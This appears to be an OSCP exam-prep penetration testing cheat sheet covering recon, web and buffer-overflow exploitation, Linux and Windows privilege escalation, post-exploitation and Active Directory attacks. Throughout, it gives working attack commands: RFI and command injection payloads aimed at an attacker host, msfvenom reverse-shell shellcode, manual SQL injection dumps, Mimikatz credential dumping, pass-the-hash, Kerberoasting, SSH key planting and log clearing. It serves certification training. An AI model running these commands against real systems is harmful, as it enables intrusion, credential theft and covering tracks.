## Penetration Testing Phases

### Reconnaissance & Enumeration 
- **Network Scanning (Nmap)** – Use Nmap to discover hosts, open ports, and services. Common options: `-sC` (default scripts), `-sV` (service/version detect), `-oA scan` (save output in all formats). For example: `nmap -sC -sV -Pn -T4 -p- -oA full_scan <TARGET>` to scan all ports with faster timing ([pen-200.pdf](file://file-XV2ghZoyonfFYmRprsyMfQ#:~:text=12,We%20recommended)). Always compare open ports with service banners and note potential avenues (e.g., web servers on 80/443, SMB on 445).
- **FTP (21)** – Check for anonymous login ([OSCP Guide | Rikunj Sindhwad - Xmind](https://xmind.app/m/QsNUEz/#:~:text=1,you%20found%20with%20other%20enum)): `ftp <TARGET>` (user: `anonymous` with any password). If successful, `ls` and `get` files looking for credentials or config backups. If upload is allowed (write access), and a web service is present, try uploading a web shell (e.g., FTP file upload to web root then access via browser) ([OSCP Guide | Rikunj Sindhwad - Xmind](https://xmind.app/m/QsNUEz/#:~:text=1,you%20found%20with%20other%20enum)). Also try any creds found elsewhere to authenticate (brute-force not usually needed).
- **SSH (22)** – Look for valid credentials from enumeration. If a username/password is found (reused credentials, leaked via files), attempt `ssh user@<TARGET>` ([OSCP Guide | Rikunj Sindhwad - Xmind](https://xmind.app/m/QsNUEz/#:~:text=1.%20maybe%20brute,Force%2099.99)). (Brute-forcing SSH is generally not effective within exam time ([OSCP Guide | Rikunj Sindhwad - Xmind](https://xmind.app/m/QsNUEz/#:~:text=1.%20maybe%20brute,Force%2099.99))). If SSH is open and you get a low-priv shell on the box via another vector, consider dropping your public key (`echo <key> >> ~/.ssh/authorized_keys`) for easier re-entry.
- **SMTP (25)** – Try VRFY/EXPN commands to enumerate users. For example: `telnet <TARGET> 25` and then `VRFY administrator` ([OSCP Guide | Rikunj Sindhwad - Xmind](https://xmind.app/m/QsNUEz/#:~:text=2.%20No%20Brute,443%2FHTTP%2FS)). Use a tool like `smtp-user-enum` to automate user enumeration. Discovered usernames can feed into password spraying or offline cracking. Also check for open relay (less common in OSCP labs).
- **DNS (53)** – If a domain name is known (from an SMB or LDAP query or given in exam), attempt a zone transfer: `dig axfr @<TARGET> <domain>` for misconfigured DNS. Also use `dnsrecon` or `dig` to brute-force subdomains (or repurpose `gobuster`/`ffuf` in DNS mode with a wordlist of subdomains).
- **HTTP/HTTPS (80, 443)** – Enumerate web servers thoroughly ([OSCP Guide | Rikunj Sindhwad - Xmind](https://xmind.app/m/QsNUEz/#:~:text=1,445%2FSMB%201.%20Null%20Session)). Use **Gobuster/FFUF** for hidden files and directories: e.g., `gobuster dir -u http://<TARGET>/ -w common.txt -t 50 -x php,txt,html` to find content ([OSCP Guide | Rikunj Sindhwad - Xmind](https://xmind.app/m/QsNUEz/#:~:text=match%20at%20L301%203,u)). Use **Nikto** for quick vulnerability checks ([OSCP Guide | Rikunj Sindhwad - Xmind](https://xmind.app/m/QsNUEz/#:~:text=1,445%2FSMB%201.%20Null%20Session)). Identify technologies/CMS (use `whatweb` or look at page source) and search for known exploits (`searchsploit <name>`) ([pen-200.pdf](file://file-XV2ghZoyonfFYmRprsyMfQ#:~:text=For%20example%2C%20we%20can%20search,the%20SMB%20service%20on%20the)). Test manually for common web vulnerabilities:
  - *SQL Injection*: Try a `' OR '1'='1` in parameters or use **sqlmap**: `sqlmap -u "http://<TARGET>/page?param=1" --batch --dbs`.
  - *LFI/RFI*: Test file inclusion by injecting `../` sequences or `http://` URLs in parameters. For LFI, try retrieving `/etc/passwd` or web config files (use a list like **PayloadAllTheThings**). For RFI, set up a quick HTTP server on your attacker (`python3 -m http.server 8080`) and point the vulnerable include to your payload (e.g., `http://<ATTACKER>:8080/shell.php`) ([OSCP Guide | Rikunj Sindhwad - Xmind](https://xmind.app/m/QsNUEz/#:~:text=4.%20Python3%20,Attacker_IP%3APORT%3E%2Ftest%207.%20Linux)).
  - *Command Injection*: Try adding `; whoami` or `&& ping -c2 <ATTACKER_IP>` in form fields or URL params. Observe response or use a listener for a ping. If blind, consider time delays (`ping -n 5 127.0.0.1` on Windows).
  - *File Upload*: If the site allows file uploads, attempt to upload a web shell (e.g., a PHP reverse shell). Bypass filters by changing extensions or adding null bytes if needed. After upload, access the file to execute code.
  - *Authentication Bypass / Default Creds*: Try default creds for common web apps (e.g., `admin:admin`). Check for exposed admin interfaces or insecure direct object references.
- **SMB (139, 445)** – **Null or Guest Sessions**: Attempt to list shares with no creds: `smbmap -H <TARGET>` or `smbclient -L //<TARGET> -N` ([OSCP Guide | Rikunj Sindhwad - Xmind](https://xmind.app/m/QsNUEz/#:~:text=1,which%20are%20available%20to%20access)). Null session can reveal shares and sometimes user lists. If shares are found, connect: `smbclient //<TARGET>/<sharename> -N` (or with `-U guest` if guest allowed) ([OSCP Guide | Rikunj Sindhwad - Xmind](https://xmind.app/m/QsNUEz/#:~:text=1,which%20are%20available%20to%20access)). Look for readable files (config files, password files, backups). If a share is writeable, see if you can upload a web shell to a web directory or place an executable to be triggered. Use `smbmap -R <sharename> -H <TARGET>` to recursively search share content. For **authenticated SMB**: if you have credentials or hashes, reuse them (`smbmap -u <USER> -p <PASS> -H <TARGET>`). Common **tools**: `smbmap` (enumerate shares/permissions) ([OSCP Guide | Rikunj Sindhwad - Xmind](https://xmind.app/m/QsNUEz/#:~:text=1,which%20are%20available%20to%20access)), `smbclient` (manual SMB interaction) ([OSCP Guide | Rikunj Sindhwad - Xmind](https://xmind.app/m/QsNUEz/#:~:text=1,which%20are%20available%20to%20access)), `enum4linux-ng` (verbose enumeration of SMB/NetBIOS), and **rpcclient** for deeper queries (e.g., `rpcclient -U "" <TARGET>` then `enumdomusers` for user list).
- **RPC/NetBIOS (135, 137, 139)** – Use `rpcclient` or `enum4linux` to enumerate users, groups, and domain info (if target is a domain controller). For example: `rpcclient -U "" <TARGET> -c enumdomusers` can list users with null session ([OSCP Guide | Rikunj Sindhwad - Xmind](https://xmind.app/m/QsNUEz/#:~:text=6,2049%2FNFS)). Also try `srvinfo` and `enumprivs` via rpcclient. NetBIOS name service (137) can leak hostnames; use `nbtscan` or `nmblookup`.
- **SNMP (161/udp)** – If SNMP is open, attempt a community string of "public" or "private": `snmpwalk -v2c -c public <TARGET> 1.3.6.1.2.1.1` (system info) or `snmpwalk -v1 -c public <TARGET> 1.3.6.1.4.1` (vendor-specific). SNMP can yield usernames, network configs, even clear-text credentials (e.g., in `iso.3.6.1.2.1.6` TCP or SNMPv3 user hashes). Use ones like `onesixtyone` to brute-force community strings quickly.
- **NFS (2049)** – List NFS exports: `showmount -e <TARGET>` ([OSCP Guide | Rikunj Sindhwad - Xmind](https://xmind.app/m/QsNUEz/#:~:text=1,3306%2FMYSQL)). Mount them if possible: `mount -t nfs <TARGET>:<share> /mnt/nfs` (might require `sudo` and a created `/mnt/nfs` directory). If an NFS share is world-readable, inspect files for creds. If world-writable and root squashing is disabled (check `/etc/exports` via the share or test creating files as root), you can create an SUID binary or malicious file. For instance, on no_root_squash, creating a suid shell or editing authorized_keys can lead to root access on the target ([OSCP Guide | Rikunj Sindhwad - Xmind](https://xmind.app/m/QsNUEz/#:~:text=1,showmount)).
- **MySQL (3306)** – Try connecting with default credentials: `mysql -h <TARGET> -u root` (blank password) ([OSCP Guide | Rikunj Sindhwad - Xmind](https://xmind.app/m/QsNUEz/#:~:text=8,mysql%20%28Client)). If able to login, check for user tables (e.g., `SELECT host,user,password_hash FROM mysql.user;`) or application databases for creds. Credentials found might be reused on the OS or other services. MySQL command line or MySQL client tools are used for interaction ([OSCP Guide | Rikunj Sindhwad - Xmind](https://xmind.app/m/QsNUEz/#:~:text=8,mysql%20%28Client)).
- **WinRM (5985/5986)** – Windows Remote Management allows command execution similar to SSH. If you have Windows credentials (user/password or NTLM hash), use **Evil-WinRM** to get a shell: `evil-winrm -i <TARGET> -u <USER> -p '<PASS>'` (or `-H <NTLMhash>` for pass-the-hash) ([OSCP Guide | Rikunj Sindhwad - Xmind](https://xmind.app/m/QsNUEz/#:~:text=1.%20mysql%20%28Client%29%209.%205985,Winrm%28Tool%29%2010.%203389%2FRDP)). This is a reliable way to get a Win shell if the account is in the local Remote Management Users group (Domain Users are often allowed by default in AD environments).
- **RDP (3389)** – If Remote Desktop is open, it’s usually a fallback. With valid credentials, you can login graphically (use `xfreerdp`: `xfreerdp /u:<USER> /p:<PASS> /v:<TARGET>`). RDP might be needed for certain Windows boxes (for example, to access a GUI-only program). In the exam, RDP is rarely required unless explicitly hinted. If you do gain RDP access, you can transfer files via shared folders or simply run commands in a terminal on the remote desktop ([OSCP Guide | Rikunj Sindhwad - Xmind](https://xmind.app/m/QsNUEz/#:~:text=10,to%20transfer%20files%20through%20remmina)).

### Exploitation 
- **Identifying Vulnerabilities** – After enumeration, map services to potential exploits. Use **SearchSploit** to find known exploits for software versions ([pen-200.pdf](file://file-XV2ghZoyonfFYmRprsyMfQ#:~:text=12,We%20recommended)). Example: `searchsploit apache 2.4.1` or for a specific CVE. Use `-p` to show path or `-m <ID>` to copy exploit locally ([pen-200.pdf](file://file-XV2ghZoyonfFYmRprsyMfQ#:~:text=kali%40kali%3A,)). Verify exploit applicability (e.g., target OS, version). Read exploit code/comments (using `searchsploit -x <ID>` or opening the file) before running to understand any requirements (like props to set or offsets).
- **Compile/Modify Exploits** – Many exploits (especially local privilege escalation ones) come in C or Python. On Kali, you can compile C code with GCC: `gcc exploit.c -o exploit` (add `-m32` for 32-bit, and `-pthread` or other flags if needed). For Linux kernel exploits, check the target architecture (`uname -m`). In Windows, if a precompiled exploit is not available, you might use MinGW on Kali to compile Windows exploits or search for a PowerShell/VBScript equivalent.
- **Buffer Overflow (BOF)** – The OSCP exam often includes a custom BOF exploit development. Steps (at a high level):
  1. **Fuzz** the service to find a crash (e.g., using `patterns_create.rb` or a simple Python fuzzer to send an increasing payload).
  2. **Find Offset** to EIP: Use Metasploit’s pattern tools: `msf-pattern_create -l <length>` to generate a pattern and send it, then note the EIP overwrite value. Run `msf-pattern_offset -q <EIP_value>` to get the exact offset where EIP is overwritten.
  3. **Verify Control**: Overwrite EIP with a unique marker (like “BBBB”) at the offset and ensure EIP becomes 0x42424242 in debugger.
  4. **Bad Characters**: Generate a bytearray of all possible bytes and send it in place of the payload to identify bad chars (commonly `0x00`, and others like `0x0a,0x0d` depending on context). Exclude bad chars from your final shellcode.
  5. **Find JMP/Call** to redirect code execution – typically find an address that will execute your shellcode (e.g., a **JMP ESP** in a loaded module with no ASLR/DEP). Use Mona (in Immunity debugger) or `!mona find -s "\xff\xe4" -m <module>` to find an address for `FFE4`.
  6. **Generate Shellcode**: Use **msfvenom** to create a payload that fits (e.g., reverse shell). Example: `msfvenom -p windows/shell_reverse_tcp LHOST=<YourIP> LPORT=<YourPort> EXITFUNC=thread -b "<badchars>" -f python` to get a Python format shellcode excluding bad chars. Or `-f c` for C style if embedding in code.
  7. **Build Exploit**: Structure: `[padding][EIP overwrite (jmp esp addr)][NOP sled][shellcode]`. Run the exploit and catch shell (set up a listener with `nc -lvnp <YourPort>`).
  – *Tip:* For OSCP’s vanilla BOF, follow the example from the **PEN-200** course exercises. Remember to disable DEP/ASLR if needed (exam BOF machines are usually preset for exploitation). Always check for common pitfalls (IP/port correctness, immunity debugger Paused state, etc).
- **Public Exploits Usage** – When using an exploit script, sometimes you need to modify it:
  - Set the target IP/port in the script or as arguments.
  - Adjust payload (some exploits allow you to specify custom shellcode or they may have a default bind shell – modify to reverse shell if needed).
  - Compile if source: for example, many Linux privilege exploits are provided as C code.
  - **Test in a safe manner**: if exploit is unreliable, consider a backup plan or try to understand what it does. Some exploits (especially older ones) might require tweaking delay or brute-forcing an offset.
- **Web Exploitation Tools** – Use **Burp Suite** as your proxy to intercept and modify HTTP requests on the fly (great for injecting payloads that browser might encode or for replaying requests with slight modifications). Use SQL inject methods listed below. “Automatic exploitation tools (e.g., db_autopwn, browser_autopwn, **SQLmap**, SQLninja, etc.)” are prohibited.
This means you need to **manually discover and exploit SQL injection** vulnerabilities **without** relying on automated scanning or exploitation features. Below is a **short guide** to **manually** perform SQL injection tests and extraction, so you can handle these scenarios within OSCP rules.

- **Manual SQL Injection Exploitation Steps**:
1. **Incrementally Test**:
   - Start with `UNION SELECT 1--` (if the normal query is `...FROM table WHERE id=X`).
   - If that fails, try `UNION SELECT 1,2--`. Keep increasing until the page doesn’t error.  
   - For example, if `UNION SELECT 1,2,3--` works, you know the table has (or the SELECT uses) 3 columns.
2. **Identify Output Columns**:
   - Once you find the correct number of columns, see which column(s) return visible data on the page. Example:
     ```
     http://<TARGET>/page?id=-1 UNION SELECT 1,2,3--
     ```
     If the second column appears in the rendered page, that is a good place to extract data.
**Extract Database Info Manually**
1. **Database Info**:
   - For MySQL, try:
     ```sql
     UNION SELECT 1,database(),version()--
     ```
     or  
     ```sql
     UNION SELECT 1,@@version,@@datadir--
     ```
   - For MSSQL, you might do `@@version` or `db_name()`.  
   - For PostgreSQL, `version()` or `current_database()`.
2. **List Tables**  
   - **MySQL**:
     ```sql
     UNION SELECT 1,table_name,3 FROM information_schema.tables 
       WHERE table_schema=database()--
     ```
   - **MSSQL**:
     ```sql
     UNION SELECT 1,name,3 FROM sysobjects 
       WHERE xtype='U'--
     ```
3. **List Columns**  
   - **MySQL**:
     ```sql
     UNION SELECT 1,column_name,3 FROM information_schema.columns 
       WHERE table_name='users'--
     ```
   - **MSSQL**:
     ```sql
     UNION SELECT 1,name,3 FROM syscolumns 
       WHERE id=OBJECT_ID('users')--
     ```
4. **Dump Table Data**  
   - For **MySQL** table `users(username, password)`, you could do:
     ```sql
     UNION SELECT 1,concat(username,':',password),3 
       FROM users--
     ```
   - Always watch for potential encoding or escaping. Also, if columns have sensitive data, you can parse it from the page output.
**Blind Injection (Boolean/Time-Based)**
If error or UNION-based injection fails:
1. **Boolean Injection**  
   - Test conditions:
     - `id=1' and 1=1--` vs. `id=1' and 1=2--`.  
     - If the page content differs (true vs. false), you have a **blind Boolean** vector.  
   - Then you can do more granular checks, e.g.:  
     - Checking the length of the database name: `id=1' AND length(database())>5--`.  
     - If page is true, you keep narrowing (binary search approach) for the exact length.
2. **Time-Based Injection**  
   - For MySQL, you can use `SLEEP()` or `BENCHMARK()`, e.g.:  
     ```
     id=1' AND IF(substr((SELECT database()),1,1)='m', SLEEP(3), 0)-- 
     ```
   - If the page takes noticeably longer, the condition is true.  
   - You systematically guess each character.
- **Password Attacks** – While brute-force is generally not productive during OSCP exam (except perhaps a **very** obvious easy password), use **Hydra** or **Medusa** if you have a small list of usernames and suspect a common password. For example, `hydra -l admin -P /usr/share/wordlists/rockyou.txt <TARGET> http-post-form "/login:username=^USER^&password=^PASS^:Invalid" -t 4` for a web login. A more targeted approach is **password spraying**: if you find a username list (from SMB/LDAP/SMTP enumeration), try a few common passwords (Spring2025!, CompanyName123) across all users rather than deep brute force. Also, always test any credentials you find on all services (reuse is common). For example, a password found in an FTP file might work for SSH or MySQL.

### Privilege Escalation
Once you have a foothold on a machine (shell access), enumerate and exploit to get higher privileges (root/Administrator). Below are key techniques and tools:

**Linux Privilege Escalation:**  
- *Manual Enumeration*: Examine the system configuration:
  - **Sudo Rights** – `sudo -l` to list commands you can run as root or other users without a password ([oscp mindmap.pdf](file://file-C4m8N2pZEBnAJotUKyWWMX#:~:text=Manual%20Approaches)). Any entry like `(ALL) NOPASSWD: <command>` can likely be exploited (search **GTFOBins** for the command to find a way to escalate).
  - **SUID/SGID Files** – `find / -perm -4000 -type f -exec ls -la {} \; 2>/dev/null` lists SUID files. If any uncommon binary is present or a common one with misconfiguration, it may be exploited (e.g., custom scripts, or known exploits like `nmap` in interactive mode, `perl` with SUID bit, etc.) ([oscp mindmap.pdf](file://file-C4m8N2pZEBnAJotUKyWWMX#:~:text=Check%20For%20Sudoers%20Misconfigurations%20%EE%A4%80)).
  - **World-Writable Files/Dirs** – e.g., check `/etc` for world-writable files, or cron jobs (`/etc/crontab`, `/etc/cron.d/`) to see if you can inject commands.
  - **Kernel/OS** – `uname -a` and `cat /etc/issue` or `lsb_release -a` to find kernel version and distro. If kernel is old, search for local exploit (e.g., DirtyCow, overlayfs). Use `searchsploit linux kernel <version>` or refer to **Linux Exploit Suggester** (run `linux-exploit-suggester.sh`) to find matching exploits.
  - **Processes/Services** – `ps -aux` and `netstat -tunlp` (or `ss -tulpn`) to see running services and open ports from the inside. You might find an internal service listening (like an admin panel on localhost or an outdated database version) that you can exploit now that you are local (port forwarding might be needed).
  - **Passwords in Memory/Configs** – Look for configuration files with credentials (common locations: `~/`, `/var/www/html`, config files for Apache, MySQL, FTP, etc.). If you find hashes in `/etc/shadow`, consider cracking them offline.
  - **Scheduled Tasks / Cron Jobs** – `crontab -l` (for current user) and check `/etc/crontab` and `/etc/cron.*/*`. If a cron job runs a script as root and you can edit that script or the path it’s in, you can inject your payload.
  - **NFS root_squash** – If the target exports NFS and you have root access on a connected client (or you can mount as root), creating a suid file on the share could lead to root on the target.
- *Automated Tools*: **LinPEAS** and **LinEnum** are popular scripts that automate many checks ([oscp mindmap.pdf](file://file-C4m8N2pZEBnAJotUKyWWMX#:~:text=Automated%20)). For example, run `wget <YourIP>/linpeas.sh; chmod +x linpeas.sh; ./linpeas.sh` from the target. They highlight potential priv-esc vectors (SUID files, CAP_* capabilities, sudo rules, etc.). Be mindful: OSCP rules allow **enumeration scripts** but not auto-exploitation; LinPEAS now sometimes suggests exploits, so use it for enumeration and exploit manually ([oscp mindmap.pdf](file://file-C4m8N2pZEBnAJotUKyWWMX#:~:text=linkedin)). Another tool is **LES (Linux Exploit Suggester)** which, given kernel version, lists known exploits ([oscp mindmap.pdf](file://file-C4m8N2pZEBnAJotUKyWWMX#:~:text=Automated%20)).
- *Common Linux PrivEsc Scenarios*: Exploiting writable `/etc/passwd` or `/etc/shadow`, abusing Docker or LXC (if you are in the docker group, you can escalate via container escape), exploiting PATH injection (e.g., cron job running as root that calls an external command without full path – you can create a malicious same-named file in a writable directory that comes earlier in PATH).

**Windows Privilege Escalation:**  
- *Manual Enumeration*: After getting a low-priv Windows shell:
  - **System Info** – Run `systeminfo` and note OS version, patch level, architecture. Compare against known exploits (e.g., Windows 7 SP1 unpatched => MS17-010 EternalBlue). Use **Windows Exploit Suggester** or searchsploit for Windows kernel exploits based on build number.
  - **User Privileges** – `whoami /all` to see privileges and group memberships ([oscp mindmap.pdf](file://file-C4m8N2pZEBnAJotUKyWWMX#:~:text=Privilege%20Escalation)). Notably, see if the user has SeImpersonatePrivilege (can lead to **JuicyPotato/RottenPotato** attack) ([oscp mindmap.pdf](file://file-C4m8N2pZEBnAJotUKyWWMX#:~:text=Privilege%20Escalation)). If SeBackupPrivilege or others are enabled, those might be exploitable as well.
  - **Unquoted Service Paths** – Check services with `wmic service get name,displayname,pathname,startmode | findstr /i "Auto"` and look for paths with spaces not enclosed in quotes and a binary that doesn’t exist in that path. If you have write access to a part of that path, you can place an executable to hijack the service on next start ([oscp mindmap.pdf](file://file-C4m8N2pZEBnAJotUKyWWMX#:~:text=3,services%20and%20its%20binpath%20%EE%A4%80)).
  - **Insecure Service Permissions** – Use `sc queryex type= service` to list services, then `sc qc <ServiceName>` and `sc sdshow <ServiceName>` to check service permissions. If the service’s configuration or binary is modifiable by your user, you can replace it or change its binary path to get a privilege escalation ([oscp mindmap.pdf](file://file-C4m8N2pZEBnAJotUKyWWMX#:~:text=installed)).
  - **Scheduled Tasks** – `schtasks /query /fo LIST /v` to see tasks. If any run with higher privileges and you can modify the executable or the task, that’s a path.
  - **Passwords in Registry/Files** – Search for strings like "Password" in the registry: `reg query HKLM /f "Password" /t REG_SZ /s` (some apps or services store creds in registry). Also check config files (especially in `C:\Program Files\` or `C:\Users\` for plain text creds). Sometimes old installation leftovers or config files (like web.config) contain database or service creds which might be reused.
  - **SAM & SYSTEM** – If you can read `C:\Windows\System32\config\SAM` and `SYSTEM` (e.g., via reg save if you have backup privileges, or Volume Shadow Copy), you can extract and crack local user hashes.
  - **DLL Hijacking** – If an executable (especially one that runs as admin or system) loads a DLL that is missing, and you can write to the folder, you can place a malicious DLL to be loaded.
- *Automated Tools*: **WinPEAS** (standalone .exe or .bat PowerShell variant) does a comprehensive check of common misconfigurations ([oscp mindmap.pdf](file://file-C4m8N2pZEBnAJotUKyWWMX#:~:text=PowerUp%20%EE%A4%80)) ([oscp mindmap.pdf](file://file-C4m8N2pZEBnAJotUKyWWMX#:~:text=WinPEAS%20%EE%A4%80)). **PowerUp** (PowerShell script from PowerSploit) can enumerate common privilege escalation vectors (unquoted paths, weak registry perms, etc.) ([oscp mindmap.pdf](file://file-C4m8N2pZEBnAJotUKyWWMX#:~:text=PowerUp%20%EE%A4%80)). Run these tools from a low-priv shell (for PowerUp, you might need to run via PowerShell: `powershell -ep bypass -c ". .\PowerUp.ps1; Invoke-AllChecks"`).
- *Common Windows PrivEsc Scenarios*: 
  - **Service Exploits**: Unquoted path or insecure file perms as mentioned – exploit by placing malicious `.exe`. 
  - **Token Impersonation**: If SeImpersonatePrivilege is present (common with service accounts), use tools like **JuicyPotato/PrintSpoofer** to get SYSTEM via token impersonation ([oscp mindmap.pdf](file://file-C4m8N2pZEBnAJotUKyWWMX#:~:text=https%3A%2F%2Fbook.hacktricks.xyz%2Fwindows%2Fwindows)). 
  - **AlwaysInstallElevated**: Check `reg query HKCU\Software\Policies\Microsoft\Windows\Installer` and HKLM equivalent for AlwaysInstallElevated = 1. If both are 1, you can create a malicious MSI and msiexec it to get SYSTEM.
  - **Autologon Credential**: `reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"` might reveal DefaultUsername/Password for autologin.
  - **MimiKatz for PrivEsc**: If you manage to run Mimikatz (possibly after gaining some privileges or if your account can debug), you can harvest credentials from memory. This is post-exploitation, but obtaining a reusable admin credential via Mimikatz can count as priv esc on that machine.

### Post-Exploitation
After obtaining root or administrator on a machine, focus on **maintaining access, extracting further credentials, and pivoting** to other targets. Key tasks and tools:

- **Password/Credential Dumping** – On Windows, use **Mimikatz** to dump credentials from LSASS. For example, run `Invoke-Mimikatz` in PowerShell or execute mimikatz.exe (be mindful of AV). Dump hashes: `mimikatz # sekurlsa::logonpasswords` (to get plaintext creds or NTLM hashes of logged-on users) or `sekurlsa::msv` for NTLM hashes, `kerberos::list /export` to extract Kerberos tickets. If Domain Admin tokens are present, you can grab them now. On Linux, gather hashes from `/etc/shadow` (if you have root, use `unshadow` and John or Hashcat to crack important user passwords). Also, dump SSH keys from users' `~/.ssh/` if present. 
- **Lateral Movement** – Use the current machine as a pivot to reach others in the network:
  - **Port Forwarding**: If new ports opened internally (e.g., a database only accessible from this host), port-forward with SSH (`ssh -L 3306:internal-db:3306 user@pivot_host`) or use tools like **Chisel** or **SSHuttle** for a broader pivot. 
  - **Pass-the-Hash / Pass-the-Ticket**: If you obtained NTLM hashes of accounts that have access to other machines, use them directly. E.g., with `psexec.py` or `wmiexec.py` from Impacket to get a shell on another host using hash (Pass-the-Hash) ([pen-200.pdf](file://file-XV2ghZoyonfFYmRprsyMfQ#:~:text=match%20at%20L39565%20In%20this,wmiexec)). For Kerberos tickets, use Mimikatz to inject a stolen ticket (`kerberos::ptt <ticket.kirbi>`) to impersonate that user on other machines (Pass-the-Ticket).
  - **Pivoting with ProxyChains**: Add pivot machine’s SSH as a dynamic SOCKS proxy (`ssh -D 1080 user@pivot`) and use proxychains to run tools (like proxychains nmap, proxychains smbclient) against the next network.
  - **Native Windows LM**: Use WinRM or WMI for lateral movement. For example, `evil-winrm` on another host if you have creds, or PowerShell Remoting (`Enter-PSSession -Computer <target> -Credential <user>` if enabled). WMI example: `wmic /user:<DOMAIN\user> /password:<PASS> /node:<TARGET> process call create "cmd.exe /c <command>"` to execute remotely.
  - **PsExec**: If you have admin creds or hash for a target and SMB is open, use `psexec.py <domain>/<user>:<pass>@<target>` (Impacket) to get a SYSTEM shell on that target ([pen-200.pdf](file://file-XV2ghZoyonfFYmRprsyMfQ#:~:text=match%20at%20L39565%20In%20this,wmiexec)).
- **Data Gathering** – Now that you’re admin, search for any remaining sensitive data or keys:
  - **Registry**: On Windows, check for interesting registry hives (SAM, SECURITY) or cached credentials (`reg save HKLM\SAM` etc. and use secretsdump).
  - **Files**: Look for files named "passwords.txt", config files, or KeePass databases, etc. Use `grep -Ri "password" /` on Linux or `findstr /si password C:\*` on Windows.
  - **Screenshots/Logging**: If needed, you can take screenshots (on Windows via `schtasks` to run a tool, or on Linux if X11, use `import -window root screenshot.png`).
- **Privilege Persistence** – In a real engagement, you’d create persistence (adding user accounts, scheduled tasks, etc.), but in OSCP exam, persistence is not required (and adding new users may violate exam rules). Instead, maintain a session (don’t accidentally lock yourself out). If you have to reboot a target (rarely needed), ensure you can regain access (e.g., service backdoor or known credentials).
- **Cleaning Up** – Not strictly needed for the exam environment, but good practice: remove any files you uploaded (scripts, exploits), remove any users or creds you created, and clear command history (`history -c` on Linux, or removing event logs on Windows if you did heavy stuff).
- **Note Taking** – Throughout exploitation and post-exploitation, keep detailed notes of commands run and outcomes (this will make report writing easier and ensure you don’t forget steps needed to replicate the hack).

### Active Directory (AD) – Cheat Sheet Basics 
*When facing an AD environment (multiple Windows machines in a domain), use specialized enumeration and attack techniques:*

- **AD Enumeration**: If you have a low-priv domain user account (often provided in OSCP exam scenario), use it to query the domain. Tools like **BloodHound** (collect data with SharpHound) map out the domain trust relationships. Run `SharpHound.exe -c All` via runas or a shell to collect data, then analyze the BloodHound output for attack paths (e.g., find users with delegated rights, find shortest path to Domain Admin). For quick command-line checks: `net user /domain` (list domain users), `net group "Domain Admins" /domain` (see members), `nltest /dclist:<Domain>` (list domain controllers) ([LOLAD and AD Exploitation](https://lolad-project.github.io/#:~:text=Collect%20Domain%20SID%20%60Get,Object%20Name)). PowerShell tools like **PowerView** (`Get-NetUser`, `Get-NetComputer`, `Find-LocalAdminAccess`) are useful for enumerating AD from a domain-joined context.
- **Common Misconfigurations**:
  - Accounts with **no preauthentication required** (user property `Do not require Kerberos preauth`): vulnerable to AS-REP Roasting.
  - **Service accounts with SPN** set and weak passwords: vulnerable to Kerberoasting (crackable service tickets) ([pen-200.pdf](file://file-XV2ghZoyonfFYmRprsyMfQ#:~:text=password%20of%20the%20service%20account,1113)).
  - Weak ACLs on AD objects (e.g., a user has GenericAll/GenericWrite on a high-priv user or group): leads to privilege escalation by abuse of that ACL (like adding yourself to Domain Admins).
  - **Unconstrained Delegation** on a machine: if you compromise that machine, you can extract tickets of users who log into it, possibly including krbtgt or DA tickets.
  - **Password reuse** between local administrator and domain accounts or across machines. If you get local admin on one box, dump credentials (with mimikatz or `Invoke-Mimikatz`) to potentially reuse on Domain Controller or other servers.
  - **Group Policy Preferences (GPP)** leftover credentials: older domains might have cpassword (MS14-025 vulnerability) in SYSVOL. Check `\\<DOMAIN>\SYSVOL\<DOMAIN>\Policies\` for XML files with "cpassword". Decrypt with gpp-decrypt tool to get plaintext password for a local admin (often).
- **Kerberoasting**: An attack to get service account hashes. Any AD user can request a Kerberos service ticket for SPNs. The ticket is encrypted with the service account’s password hash. **Kerberoasting** involves requesting service tickets and cracking them offline ([pen-200.pdf](file://file-XV2ghZoyonfFYmRprsyMfQ#:~:text=password%20of%20the%20service%20account,1113)). Use **Impacket** `GetUserSPNs.py`: `python3 GetUserSPNs.py <DOMAIN>/<USER>:<PASS> -request` which returns Kerberos TGS hashes that you can feed into Hashcat (mode 13100) ([pen-200.pdf](file://file-XV2ghZoyonfFYmRprsyMfQ#:~:text=kali%40kali%3A~%24%20sudo%20hashcat%20,force)). Or use **Rubeus** on Windows: `Rubeus.exe kerberoast /outfile:hashes.txt`. Then crack with `hashcat -m 13100 hashes.txt rockyou.txt` (or use a custom wordlist/rules). A cracked service account password might be reused elsewhere or might itself have high privileges. *Remember:* Service accounts might not be Domain Admins, but sometimes they have local admin on certain boxes or delegation rights.
- **AS-REP Roasting**: Similar concept but for user accounts that have Kerberos Preauthentication disabled. Attackers can request an AS-REP directly and get a response encrypted with the user’s password hash ([pen-200.pdf](file://file-XV2ghZoyonfFYmRprsyMfQ#:~:text=controller%20on%20behalf%20of%20any,encrypted%20part%20of%20the%20response)) ([pen-200.pdf](file://file-XV2ghZoyonfFYmRprsyMfQ#:~:text=Listing%20804%20,REP%20roasting)). Use Impacket `GetNPUsers.py`: `GetNPUsers.py <DOMAIN>/ -usersfile users.txt -no-pass -format hashcat` to get crackable AS-REP hashes (Hashcat mode 18200) ([pen-200.pdf](file://file-XV2ghZoyonfFYmRprsyMfQ#:~:text=Therefore%2C%20let%E2%80%99s%20check%20the%20correct,%E2%80%9CKerberos%E2%80%9D%20in%20the%20Hashcat%20help)). Any cracked password here is cleartext for that user, which might be a high-privilege account or at least a stepping stone.
- **Ticket Attacks**:
  - **Pass-the-Ticket (PtT)** – Using a stolen **Kerberos ticket** to authenticate. For example, if you compromise a user and dump their TGT (with mimikatz `kerberos::list /export`), you can use `kerberos::ptt` to inject that ticket and assume the user’s identity. This is often used for lateral movement without needing the password or hash, as long as the ticket is valid.
